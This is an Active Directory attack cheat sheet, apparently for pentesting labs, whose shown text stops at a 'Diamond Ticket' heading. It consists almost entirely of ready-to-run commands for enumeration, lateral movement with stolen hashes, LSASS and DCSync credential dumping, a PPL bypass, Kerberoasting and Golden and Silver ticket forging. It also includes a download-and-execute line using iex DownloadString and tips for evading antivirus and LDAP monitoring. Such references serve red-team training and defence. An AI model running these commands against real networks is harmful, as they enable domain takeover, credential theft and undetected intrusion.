# Active Directory Attack & Pentesting Cheat Sheet

> Comprehensive reference for AD enumeration, exploitation, lateral movement, persistence, and evasion.  
> **Every command includes a description of what it does.**

---

## Table of Contents

1. [Enumeration](#1-enumeration)
2. [Privilege Escalation](#2-privilege-escalation)
3. [Lateral Movement](#3-lateral-movement)
4. [Credential Extraction](#4-credential-extraction)
5. [Kerberos Attacks](#5-kerberos-attacks)
6. [Delegation Abuse](#6-delegation-abuse)
7. [ACL / ACE Abuse](#7-acl--ace-abuse)
8. [AD CS (Certificate Services) Abuse](#8-ad-cs-certificate-services-abuse)
9. [Trust Abuse (Cross-Domain & Cross-Forest)](#9-trust-abuse-cross-domain--cross-forest)
10. [Persistence](#10-persistence)
11. [MSSQL Attacks](#11-mssql-attacks)
12. [DPAPI & Credential Vaults](#12-dpapi--credential-vaults)
13. [LAPS, gMSA & DMSA](#13-laps-gmsa--dmsa)
14. [Shadow Credentials](#14-shadow-credentials)
15. [GPO Abuse](#15-gpo-abuse)
16. [Azure AD / Entra Connect Abuse](#16-azure-ad--entra-connect-abuse)
17. [Coercion Attacks](#17-coercion-attacks)
18. [Evasion & Bypass Techniques](#18-evasion--bypass-techniques)
19. [BloodHound & Graph-Based Recon](#19-bloodhound--graph-based-recon)
20. [Impacket Suite](#20-impacket-suite)
21. [CrackMapExec / NetExec](#21-crackmapexec--netexec)
22. [BloodyAD](#22-bloodyad)

---

## 1. Enumeration

### PowerView (PowerSploit)

> PowerView is a PowerShell tool for AD recon. It queries LDAP/ADSI to enumerate users, groups, GPOs, ACLs, trusts, shares, and sessions without needing RSAT installed.

```powershell
Import-Module .\PowerView.ps1          # Load PowerView into the current PowerShell session
. .\PowerView.ps1                       # Dot-source PowerView (alternative loading method)
```

**Domain Info**

```powershell
Get-Domain                              # Retrieve information about the current domain (name, domain controllers, forest)
Get-DomainController                    # List all domain controllers in the current domain
Get-DomainSID                           # Get the Security Identifier (SID) of the current domain
```

**User Enumeration**

```powershell
Get-DomainUser                                                  # List all user accounts in the domain
Get-DomainUser -Identity student1                               # Get detailed info for a specific user
Get-DomainUser -Properties samaccountname,description           # List users showing only username and description fields
Get-DomainUser -SPN                                             # Find users with Service Principal Names set (Kerberoastable targets)
Get-DomainUser -PreauthNotRequired                              # Find users that don't require Kerberos pre-auth (AS-REP Roastable)
Get-DomainUser -AdminCount                                      # Find users with AdminCount=1 (protected by AdminSDHolder, likely privileged)
Get-DomainUser -TrustedToAuth                                   # Find users configured for constrained delegation
Get-DomainUser | Where-Object {$_.memberof -match "Domain Admins"}  # Find all members of the Domain Admins group
```

**Computer Enumeration**

```powershell
Get-DomainComputer                                              # List all computer accounts in the domain
Get-DomainComputer -Unconstrained                               # Find computers with unconstrained delegation enabled (store user TGTs)
Get-DomainComputer -TrustedToAuth                               # Find computers configured for constrained delegation
Get-DomainComputer -Properties dnshostname,operatingsystem      # List computers showing hostname and OS version
```

**Group Enumeration**

```powershell
Get-DomainGroup                                                 # List all groups in the domain
Get-DomainGroup -Identity "Domain Admins"                       # Get details of the Domain Admins group
Get-DomainGroupMember -Identity "Domain Admins" -Recurse        # List all members of Domain Admins including nested group members
Get-DomainGroupMember -Identity "Enterprise Admins"             # List members of Enterprise Admins (forest-level admin group)
```

**Group Policy Enumeration**

```powershell
Get-DomainGPO                                                   # List all Group Policy Objects in the domain
Get-DomainGPO -ComputerIdentity dcorp-student1                  # Find GPOs applied to a specific computer
Get-DomainGPO | Where-Object {$_.displayname -like "*Restricted*"}  # Search for GPOs by display name pattern
Get-DomainGPOLocalGroup                                         # Find local group memberships configured via GPO (Restricted Groups)
```

**OU Enumeration**

```powershell
Get-DomainOU                                                    # List all Organizational Units in the domain
Get-DomainOU | Select-Object name,gplink                        # List OUs and their linked GPOs
(Get-DomainOU -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_}  # List all computers inside a specific OU
```

**ACL Enumeration**

```powershell
Find-InterestingDomainAcl -ResolveGUIDs                         # Find ACLs where non-default principals have dangerous permissions (GenericAll, WriteDACL, etc.)
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "student"}  # Filter interesting ACLs for a specific user/group
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs     # Get the full ACL for the Domain Admins group object
Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs      # Get all ACEs that apply to a specific user object
```

**Trust Enumeration**

```powershell
Get-DomainTrust                                                 # List all domain trusts for the current domain
Get-DomainTrust -Domain moneycorp.local                         # List trusts for a specific domain
Get-ForestDomain                                                # List all domains in the current forest
Get-ForestTrust                                                 # List all forest-level trusts
Get-ForestDomain -Forest eurocorp.local                         # List all domains in a different forest
```

**Share & Session Enumeration**

```powershell
Find-DomainShare -CheckShareAccess                              # Find accessible network shares across the domain
Find-DomainUserLocation                                         # Find machines where specific users are logged in (useful for hunting high-value targets)
Get-NetSession -ComputerName dcorp-dc                           # List active SMB sessions on a specific computer
Get-NetLoggedon -ComputerName dcorp-dc                          # List users currently logged on to a specific computer
```

**SPN & Delegation Enumeration**

```powershell
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname  # List all users with SPNs (potential Kerberoast targets) and their SPN values
Get-DomainUser -TrustedToAuth | Select-Object samaccountname,msds-allowedtodelegateto  # List constrained delegation users and the services they can delegate to
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname,msds-allowedtodelegateto  # List constrained delegation computers and their delegation targets
```

**RBCD Enumeration & Configuration**

```powershell
Get-DomainComputer -Identity target$ | Select-Object msds-allowedtoactonbehalfofotheridentity  # Check which principals can impersonate users to a target via RBCD
Set-DomainObject -Identity target$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SD}       # Set the RBCD attribute on a target computer (allows a controlled account to impersonate users)
```

**LAPS Password Reading**

```powershell
Get-DomainComputer -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime  # Read LAPS-managed local admin passwords and their expiration times (requires read permission on the attribute)
```

---

### AD Module (Microsoft RSAT)

> The Active Directory PowerShell module is Microsoft's official tool for AD management. It's signed by Microsoft, so it's less likely to be flagged by security tools compared to PowerView.

```powershell
# Load AD Module without installing RSAT — downloads and imports a standalone version
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1')
Import-ActiveDirectory
```

**User Enumeration**

```powershell
Get-ADUser -Filter * -Properties *                                          # Get all users with all properties (verbose, use cautiously in large domains)
Get-ADUser -Identity student1 -Properties *                                 # Get all properties for a specific user
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName  # Find users with SPNs set (Kerberoastable)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}                        # Find users with Kerberos pre-auth disabled (AS-REP Roastable)
Get-ADUser -Filter {AdminCount -eq 1}                                       # Find privileged users (AdminCount flag set by AdminSDHolder)
```

**Computer Enumeration**

```powershell
Get-ADComputer -Filter * -Properties *                                      # List all computer accounts with full properties
Get-ADComputer -Filter {TrustedForDelegation -eq $true}                     # Find computers with unconstrained delegation (store forwarded TGTs)
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true}               # Find computers with protocol transition (constrained delegation with S4U2Self)
Get-ADComputer -Filter 'ms-DS-MachineAccountQuota -ne 0'                    # Check Machine Account Quota (how many computers a user can join to the domain)
```

**Group Enumeration**

```powershell
Get-ADGroup -Filter * | Select-Object Name                                 # List all group names in the domain
Get-ADGroupMember -Identity "Domain Admins" -Recursive                      # List all Domain Admins members including nested groups
Get-ADGroup -Filter {AdminCount -eq 1}                                      # Find all groups protected by AdminSDHolder (privileged groups)
```

**Trust & Forest Enumeration**

```powershell
Get-ADTrust -Filter *                                                       # List all trusts (intra-forest and external)
Get-ADForest | Select-Object -ExpandProperty Domains                        # List all domains in the current forest
(Get-ADForest).Domains | ForEach-Object {Get-ADDomain -Server $_}           # Get detailed info for each domain in the forest
```

**OU & DC Enumeration**

```powershell
Get-ADOrganizationalUnit -Filter * -Properties *                            # List all OUs with full properties
Get-ADDomainController -Filter *                                            # List all domain controllers with details
Get-ADDomainController -Discover                                            # Find the nearest available domain controller
```

**Service Account Enumeration**

```powershell
Get-ADServiceAccount -Filter *                                              # List all managed service accounts (MSAs)
Get-ADServiceAccount -Identity svc_account -Properties *                    # Get full details for a specific service account
Get-ADServiceAccount -Filter {ObjectClass -eq 'msDS-GroupManagedServiceAccount'} -Properties *  # List all Group Managed Service Accounts (gMSAs)
```

**ACL Enumeration**

```powershell
(Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local").Access  # Get the DACL (access control entries) for the Domain Admins object using .NET
```

---

### SharpADWS (SOAP-Based Enumeration)

> SharpADWS queries AD via the Active Directory Web Services (ADWS) on port 9389 instead of LDAP. This bypasses traditional LDAP monitoring and detection tools.

```powershell
SharpADWS.exe Cache                                            # Build a local cache of AD objects from ADWS for offline analysis
SharpADWS.exe Acl -dn "DC=dollarcorp,DC=moneycorp,DC=local"   # Enumerate all ACLs in the domain via ADWS (find who has dangerous permissions)
SharpADWS.exe DCSync                                           # Find principals that have DCSync-capable permissions (Replicating Directory Changes)
```

---

### SOAPHound

> SOAPHound is another ADWS-based tool that collects AD data for BloodHound ingestion, bypassing LDAP-based detection.

```powershell
SOAPHound.exe --buildcache -c c:\temp\cache.txt                       # Collect and cache AD data via ADWS into a local file
SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output  # Convert cached data into BloodHound-compatible JSON files
SOAPHound.exe -c c:\temp\cache.txt --certdump -o c:\temp\adcs-output  # Extract AD Certificate Services (ADCS) data from the cache
```

---

### ldapsearch (Linux)

> Standard Linux LDAP client for querying AD directly over the LDAP protocol.

```bash
# Query AD anonymously (works if anonymous binds are allowed)
ldapsearch -x -H ldap://10.10.10.1 -b "DC=test,DC=local"

# Query AD with valid credentials
ldapsearch -x -H ldap://10.10.10.1 -D "CN=john,CN=Users,DC=test,DC=local" -w 'password123' -b "DC=test,DC=local"

# Find computers with unconstrained delegation using LDAP filter (userAccountControl bit 524288 = TRUSTED_FOR_DELEGATION)
ldapsearch -x -H ldap://10.10.10.1 -D "john@test.local" -w 'password123' -b "DC=test,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# Find all user accounts that have an SPN set (potential Kerberoast targets)
ldapsearch -x -H ldap://10.10.10.1 -D "john@test.local" -w 'password123' -b "DC=test,DC=local" "(&(objectClass=user)(servicePrincipalName=*))"
```

---

### enum4linux-ng

> Automated SMB/LDAP/RPC enumeration tool for getting users, shares, groups, and policies from Windows/Samba systems.

```bash
enum4linux-ng -A 10.10.10.1                                     # Full automated enumeration (users, shares, groups, policies) using null session
enum4linux-ng -u 'john' -p 'password123' -A 10.10.10.1          # Full automated enumeration with valid credentials
```

---

## 2. Privilege Escalation

### PowerUp

> PowerUp checks for common Windows privilege escalation misconfigurations (unquoted service paths, writable service executables, registry autorun, etc.).

```powershell
Import-Module .\PowerUp.ps1             # Load the PowerUp module
Invoke-AllChecks                         # Run all privilege escalation checks at once and display results

Get-ServiceUnquoted                      # Find services with unquoted paths containing spaces (allows DLL/EXE hijacking)
Get-ModifiableServiceFile                # Find services whose executable path points to a file the current user can modify
Get-ModifiableService                    # Find services whose configuration (binpath, start type) the current user can change
Get-UnattendedInstallFile                # Search for unattend.xml files that may contain cleartext admin credentials
Get-RegistryAlwaysInstallElevated        # Check if AlwaysInstallElevated policy is enabled (allows .msi to run as SYSTEM)
```

---

### WinPEAS

> WinPEAS (Windows Privilege Escalation Awesome Scripts) is an automated enumeration tool that checks hundreds of local privilege escalation vectors.

```powershell
.\winPEASx64.exe                         # Run full enumeration — checks services, files, registry, tokens, credentials, and more
.\winPEASx64.exe quiet servicesinfo      # Only check for vulnerable service configurations (less output)
.\winPEASx64.exe quiet windowscreds      # Only check for stored Windows credentials (WiFi passwords, saved creds, vaults)
```

---

### PrivescCheck

> PowerShell-based privilege escalation checker — alternative to PowerUp with more modern checks.

```powershell
Import-Module .\PrivescCheck.ps1         # Load the module
Invoke-PrivescCheck -Extended            # Run extended checks including all privilege escalation vectors
```

---

### SharpUp

> C# implementation of PowerUp — performs the same privilege escalation checks but as a .NET assembly (useful when PowerShell is restricted).

```powershell
SharpUp.exe audit                        # Run all privilege escalation audits and display results
```

---

### Seatbelt

> Seatbelt is a C# security auditing tool that gathers system, user, and process information useful for both offense and defense.

```powershell
Seatbelt.exe -group=all                  # Run ALL collection modules (system info, credentials, browser data, network, etc.)
Seatbelt.exe -group=user                 # Run only user-related modules (browser history, recent files, saved RDP connections, etc.)
Seatbelt.exe -group=system               # Run only system-related modules (services, firewall rules, AV status, patches, etc.)
```

---

### Leaked Handle Abuse

> If a privileged process leaks a handle to LSASS or another protected process, an attacker can duplicate it to gain elevated access.

```powershell
.\handle64.exe -a -p lsass              # List all handles to the LSASS process — look for handles held by non-system processes (Sysinternals Handle)
.\LeakedHandleExploit.exe               # Exploit a leaked handle to duplicate it and gain SYSTEM-level access
```

---

## 3. Lateral Movement

### PowerShell Remoting (PSRemoting)

> PSRemoting uses WinRM (port 5985/5986) to execute commands on remote computers. Requires local admin on the target and WinRM enabled.

```powershell
Enter-PSSession -ComputerName dcorp-mgmt                        # Open an interactive remote PowerShell session on the target machine
$sess = New-PSSession -ComputerName dcorp-mgmt                   # Create a persistent PSSession object (reusable for multiple commands)
Invoke-Command -Session $sess -ScriptBlock {whoami;hostname}     # Execute commands on the remote machine using the persistent session

Invoke-Command -ComputerName dcorp-mgmt,dcorp-adminsrv -ScriptBlock {whoami}  # Execute a command on multiple machines simultaneously
Invoke-Command -ScriptBlock {whoami} -ComputerName (Get-Content servers.txt)  # Execute on all machines listed in a file

# Create a credential object for authenticating as a different user
$cred = New-Object System.Management.Automation.PSCredential("domain\user", (ConvertTo-SecureString "password" -AsPlainText -Force))
Enter-PSSession -ComputerName dcorp-mgmt -Credential $cred       # Interactive remote session with explicit credentials
Invoke-Command -ComputerName dcorp-mgmt -Credential $cred -ScriptBlock {whoami}  # Remote command with explicit credentials

Invoke-Command -FilePath C:\scripts\Invoke-Mimikatz.ps1 -Session $sess  # Load a local .ps1 script into the remote session (transfers and dot-sources it)
Invoke-Command -Session $sess -ScriptBlock {function_from_loaded_script}  # Call a function from the previously loaded script on the remote machine
```

---

### winrs

> Windows Remote Shell — a built-in CMD tool for remote command execution via WinRM. Doesn't rely on PowerShell, so it avoids PowerShell-based logging.

```cmd
winrs -r:dcorp-mgmt cmd                                        # Open an interactive CMD shell on the remote machine
winrs -r:dcorp-mgmt "set username && set computername"          # Run a command on the remote machine and display environment variables
winrs -r:dcorp-mgmt "powershell -ep bypass -c whoami"           # Launch PowerShell on the remote machine and run a command
```

---

### WMI

> Windows Management Instrumentation — uses DCOM (port 135 + dynamic) to create remote processes. Does not require WinRM.

```powershell
# Create a new process on the remote machine via WMI (runs under the specified user's context)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -ep bypass -c whoami" -ComputerName dcorp-mgmt -Credential $cred
```

```cmd
# CMD version — uses wmic.exe to create a process on a remote machine
wmic /node:dcorp-mgmt process call create "cmd /c whoami > C:\temp\output.txt"
```

---

### DCOM

> Distributed COM allows remote code execution by instantiating COM objects on a remote machine. Uses port 135 + dynamic RPC.

```powershell
# MMC20.Application — instantiate the MMC COM object on a remote machine and use it to execute a shell command
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","dcorp-mgmt"))
$com.Document.ActiveView.ExecuteShellCommand("powershell","-ep bypass -c whoami","","7")

# ShellWindows — use the ShellWindows COM object to execute a command via Explorer's shell
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","dcorp-mgmt"))
$com.Item().Document.Application.ShellExecute("cmd","/c whoami > C:\temp\out.txt","","",0)
```

---

### Pass-the-Hash (PtH)

> PtH uses the NTLM hash directly to authenticate without knowing the plaintext password. Works because NTLM authentication only needs the hash.

```powershell
# Mimikatz — start a new process authenticated with the NTLM hash (injects credentials into a new logon session)
sekurlsa::pth /user:administrator /domain:dollarcorp.moneycorp.local /ntlm:<hash> /run:powershell.exe

# SafetyKatz — same as above but runs Mimikatz in-memory to avoid writing to disk
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:dollarcorp.moneycorp.local /ntlm:<hash> /run:powershell.exe" "exit"
```

```bash
# Impacket PSExec — get a remote shell using NTLM hash (uploads a service binary, runs as SYSTEM)
python3 psexec.py -hashes :NTLM_HASH domain/user@target

# Impacket WMIExec — execute commands via WMI using NTLM hash (stealthier, no service creation)
python3 wmiexec.py -hashes :NTLM_HASH domain/user@target

# Impacket SMBExec — execute commands via SMB using NTLM hash (uses a temporary service)
python3 smbexec.py -hashes :NTLM_HASH domain/user@target

# Impacket DCOMExec — execute commands via DCOM (MMC20) using NTLM hash
python3 dcomexec.py -object MMC20 -hashes :NTLM_HASH domain/user@target

# Impacket ATExec — execute a command via Scheduled Tasks using NTLM hash
python3 atexec.py -hashes :NTLM_HASH domain/user@target whoami

# NetExec — PtH to execute CMD commands via SMB
nxc smb target -u user -H NTLM_HASH -x whoami

# NetExec — PtH using WMI execution method instead of default
nxc smb target -u user -H NTLM_HASH --exec-method wmiexec -x whoami

# NetExec — PtH to execute commands via WinRM
nxc winrm target -u user -H NTLM_HASH -x whoami
```

---

### OverPass-the-Hash / Pass-the-Key

> Converts an NTLM hash or AES key into a Kerberos TGT, then uses Kerberos authentication. More stealthy than NTLM-based PtH.

```powershell
# Rubeus — request a TGT from the KDC using the user's NTLM hash and inject it into the current session
Rubeus.exe asktgt /user:administrator /rc4:<ntlm_hash> /ptt

# Rubeus — same but using AES256 key (more OPSEC-safe as AES is the default encryption in modern AD)
Rubeus.exe asktgt /user:administrator /aes256:<aes256_key> /ptt /opsec

# Rubeus — create a new hidden logon session (sacrificial process), request TGT, and inject it there
Rubeus.exe asktgt /user:administrator /aes256:<aes256_key> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```bash
# Impacket — request a TGT using NTLM hash and save as a .ccache file
python3 getTGT.py domain/user -hashes :NTLM_HASH -dc-ip DC_IP

# Set the Kerberos ticket cache environment variable so other tools use it
export KRB5CCNAME=user.ccache

# Use the cached TGT for Kerberos-based authentication (no password/hash needed)
python3 psexec.py domain/user@target -k -no-pass
```

---

### Evil-WinRM

> Ruby-based WinRM shell client for penetration testers. Provides file upload/download, in-memory .NET assembly loading, and more.

```bash
evil-winrm -i target -u user -p 'password'     # Connect to WinRM using plaintext credentials
evil-winrm -i target -u user -H NTLM_HASH      # Connect to WinRM using Pass-the-Hash
```

---

### WSManWinRM (C# / Custom)

> Custom C# WinRM client that uses raw WSMan API — avoids PowerShell.exe entirely, so PowerShell logging/AMSI don't apply.

```powershell
.\WSManWinRM.exe target "cmd /c whoami"          # Execute a command on the remote machine via raw WSMan (no PowerShell process created)
```

---

## 4. Credential Extraction

### Mimikatz / SafetyKatz

> Mimikatz extracts credentials from Windows memory (LSASS), the SAM database, LSA secrets, and more. SafetyKatz runs Mimikatz in-memory to avoid AV detection.

```powershell
privilege::debug                         # Enable SeDebugPrivilege (required to access LSASS process memory)
sekurlsa::logonpasswords                 # Dump all plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory

sekurlsa::ekeys                          # Dump all Kerberos encryption keys (AES256, AES128, RC4/NTLM) from LSASS

lsadump::dcsync /user:dcorp\krbtgt       # Perform DCSync to replicate the krbtgt account's password hash from the DC (requires Replicating Directory Changes rights)
lsadump::dcsync /user:dcorp\administrator /domain:dollarcorp.moneycorp.local  # DCSync a specific user from a specific domain

lsadump::lsa /patch                      # Dump all password hashes from the LSA (Security Account Manager) on the local machine

lsadump::trust /patch                    # Extract trust keys between domains (needed for forging inter-realm tickets)

token::elevate                           # Impersonate SYSTEM token to gain highest local privileges
lsadump::sam                             # Dump the local SAM database (local user password hashes)

vault::cred                              # Dump Windows Credential Vault entries (saved web/network credentials)
vault::list                              # List all saved credentials in the Windows Vault

sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:cmd.exe  # Pass-the-Hash: create a new process with the given NTLM hash for authentication

# SafetyKatz — in-memory Mimikatz (PE loaded in memory, not written to disk, avoids static AV signatures)
SafetyKatz.exe "sekurlsa::ekeys" "exit"                         # Dump Kerberos encryption keys via in-memory Mimikatz
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"      # DCSync via in-memory Mimikatz
SafetyKatz.exe "lsadump::lsa /patch" "exit"                     # Dump LSA secrets via in-memory Mimikatz
```

---

### Rubeus (Credential Ops)

> Rubeus is a C# tool for Kerberos abuse — ticket requests, dumping, monitoring, roasting, and more.

```powershell
Rubeus.exe dump                          # Dump all Kerberos tickets from all logon sessions on the machine
Rubeus.exe dump /luid:0x3e4 /service:krbtgt  # Dump only the TGT (krbtgt service) for a specific logon session ID

Rubeus.exe triage                        # Show a summary of all Kerberos tickets in all accessible logon sessions

Rubeus.exe monitor /interval:5 /nowrap   # Continuously monitor for new TGTs appearing in logon sessions (check every 5 seconds)

Rubeus.exe hash /password:Password123    # Calculate the NTLM/AES hash of a plaintext password (useful for RBCD, machine accounts)
```

---

### DCSync

> DCSync impersonates a domain controller to request password replication data using the MS-DRSR protocol. Requires "Replicating Directory Changes" + "Replicating Directory Changes All" rights.

```powershell
# Mimikatz DCSync
lsadump::dcsync /user:dcorp\krbtgt       # Replicate the krbtgt hash from a DC (used for Golden Ticket forging)
lsadump::dcsync /user:dcorp\administrator # Replicate the domain admin hash from a DC
lsadump::dcsync /all /csv                # Replicate ALL user hashes from the DC and output in CSV format
```

```bash
# Impacket secretsdump — performs DCSync, SAM dump, LSA secrets dump remotely
python3 secretsdump.py domain/user:password@DC_IP               # Full dump: DCSync + SAM + LSA secrets + DPAPI keys
python3 secretsdump.py -hashes :NTLM_HASH domain/user@DC_IP    # Same but authenticating with NTLM hash
python3 secretsdump.py -k -no-pass domain/user@DC_FQDN         # Same but using Kerberos authentication from ccache

# DCSync only (DRSUAPI replication) — more targeted, less noisy
python3 secretsdump.py -just-dc domain/user:password@DC_IP     # Only replicate domain user hashes via DRSUAPI (no SAM/LSA/DPAPI)
python3 secretsdump.py -just-dc-ntlm domain/user:password@DC_IP  # Same but only extract NTLM hashes (skip Kerberos keys)
python3 secretsdump.py -just-dc-user krbtgt domain/user:password@DC_IP  # DCSync only the krbtgt account

# Offline NTDS.dit parsing — extract hashes from a stolen copy of the AD database
python3 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

---

### PPLBlade (Bypass PPL on LSASS)

> PPLBlade bypasses Protected Process Light (PPL) on LSASS to dump credentials even when PPL protection is enabled.

```powershell
PPLBlade.exe --mode dump --obfuscate     # Dump LSASS memory while bypassing PPL protection (with obfuscation to evade detection)
PPLBlade.exe --mode decrypt --input lsass.dmp  # Decrypt/parse a previously dumped LSASS minidump file
```

---

### pypykatz (Python Mimikatz)

> Pure Python implementation of Mimikatz — parses LSASS dumps and registry hives offline on Linux without needing Windows.

```bash
pypykatz lsa minidump lsass.dmp          # Parse an LSASS minidump file and extract credentials (works offline on Linux)
pypykatz registry --sam SAM --system SYSTEM --security SECURITY  # Extract local user hashes from offline SAM/SYSTEM/SECURITY registry hives
```

---

### lsassy

> Remotely dumps LSASS credentials on a target machine. It uploads a dump tool, retrieves the dump, and parses it locally.

```bash
lsassy -u user -p password -d domain target     # Remotely dump LSASS credentials from the target using password auth
lsassy -u user -H NTLM_HASH -d domain target    # Same but authenticating via Pass-the-Hash
```

---

### Snaffler (Credential Finder)

> Snaffler crawls accessible SMB shares looking for sensitive files (credentials, config files, private keys, passwords in scripts, etc.).

```powershell
Snaffler.exe -s -o snaffler_output.txt   # Scan all accessible shares for interesting files and save results to a file (-s = simple output)
```

---

## 5. Kerberos Attacks

### Kerberoasting

> Kerberoasting requests Kerberos service tickets (TGS) for accounts with SPNs, then cracks them offline. The ticket is encrypted with the service account's password hash.

```powershell
# Rubeus — request TGS for all Kerberoastable accounts and save hashes for offline cracking
Rubeus.exe kerberoast /outfile:hashes.txt

# Rubeus — Kerberoast a specific user only
Rubeus.exe kerberoast /user:svc_sql /outfile:hash.txt

# Rubeus — only target accounts using RC4 encryption (weaker, easier to crack; avoids AES accounts for OPSEC)
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

# Rubeus — show statistics about Kerberoastable accounts without actually requesting tickets
Rubeus.exe kerberoast /stats

# PowerView — request TGS for all users with SPNs and output in Hashcat format
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File hashes.txt

# AD Module — find users with SPNs and request tickets for them
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | ForEach-Object {Request-SPNTicket -SPN $_.ServicePrincipalName[0]}
```

```bash
# Impacket — request TGS tickets for all Kerberoastable users and save crackable hashes
python3 GetUserSPNs.py domain/user:password -dc-ip DC_IP -request -outputfile hashes.txt

# NetExec — Kerberoast all eligible accounts via LDAP
nxc ldap DC_IP -u user -p password --kerberoasting output.txt

# Targeted Kerberoast — sets an SPN on a target user (if you have write permissions), then Kerberoasts them
python3 targetedKerberoast.py -d domain -u user -p password --dc-ip DC_IP
```

```bash
# Crack Kerberos 5 TGS-REP hashes with hashcat (mode 13100)
hashcat -m 13100 hashes.txt wordlist.txt
```

---

### AS-REP Roasting

> Targets users with "Do not require Kerberos preauthentication" enabled. The KDC responds with an encrypted ticket that can be cracked offline.

```powershell
# Rubeus — request AS-REP for all users with preauth disabled and output in Hashcat format
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Rubeus — target a specific user
Rubeus.exe asreproast /user:target_user /format:hashcat /outfile:hash.txt

# PowerView — find users with preauth disabled (enumeration only)
Get-DomainUser -PreauthNotRequired
```

```bash
# Impacket — try AS-REP roasting against a list of usernames (no password needed for the request)
python3 GetNPUsers.py domain/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile hashes.txt

# Impacket — with valid credentials, automatically find and roast all AS-REP vulnerable users
python3 GetNPUsers.py domain/user:password -dc-ip DC_IP -request

# NetExec — AS-REP roast using a userlist (empty password = no auth needed for the request)
nxc ldap DC_IP -u users.txt -p '' --asreproast output.txt

# Crack AS-REP hashes with hashcat (mode 18200)
hashcat -m 18200 hashes.txt wordlist.txt
```

---

### Golden Ticket

> Forges a TGT by encrypting it with the krbtgt account's hash. Grants access as any user to any service in the domain. Requires the krbtgt hash + domain SID.

```powershell
# Mimikatz — forge a Golden Ticket using krbtgt NTLM hash and inject into the current session
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /krbtgt:KRBTGT_NTLM_HASH /ptt

# Mimikatz — forge a Golden Ticket using krbtgt AES256 key (harder to detect, matches modern encryption)
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /aes256:KRBTGT_AES256_KEY /ptt

# Mimikatz — Golden Ticket with SID History injection (escalate from child domain to parent domain as Enterprise Admin)
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /krbtgt:HASH /sids:S-1-5-21-<parent-domain-SID>-519 /ptt

# Rubeus — forge Golden Ticket with RC4 (NTLM)
Rubeus.exe golden /rc4:KRBTGT_HASH /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /ptt

# Rubeus — forge Golden Ticket with AES256
Rubeus.exe golden /aes256:KRBTGT_AES256 /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /ptt
```

```bash
# Impacket — create a Golden Ticket and save as a .ccache file
python3 ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator

# Use the forged ticket for authentication
export KRB5CCNAME=Administrator.ccache
python3 psexec.py domain/Administrator@DC -k -no-pass
```

---

### Silver Ticket

> Forges a TGS for a specific service using the service account's hash. Only grants access to that one service, but doesn't contact the KDC (harder to detect).

```powershell
# Mimikatz — forge a Silver Ticket for CIFS (file share access) on a target server
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:MACHINE_NTLM_HASH /ptt

# Silver Ticket for HOST service (scheduled tasks, WMI)
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:HASH /ptt

# Silver Ticket for HTTP service (web applications, WinRM via HTTP)
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /target:dcorp-dc.dollarcorp.moneycorp.local /service:HTTP /rc4:HASH /ptt

# Silver Ticket for RPCSS service (remote service management via RPC)
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:HASH /ptt

# Silver Ticket for WSMAN service (WinRM / PSRemoting)
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /target:dcorp-dc.dollarcorp.moneycorp.local /service:WSMAN /rc4:HASH /ptt

# Common Silver Ticket services: CIFS (file shares), HOST (tasks/WMI), HTTP (web/WinRM), WSMAN (PSRemoting), RPCSS (RPC), LDAP (DC queries), MSSQLSvc (SQL Server)
```

```bash
# Impacket — create a Silver Ticket for CIFS service and save as .ccache
python3 ticketer.py -nthash MACHINE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local Administrator
```

---

### Diamond Ticket

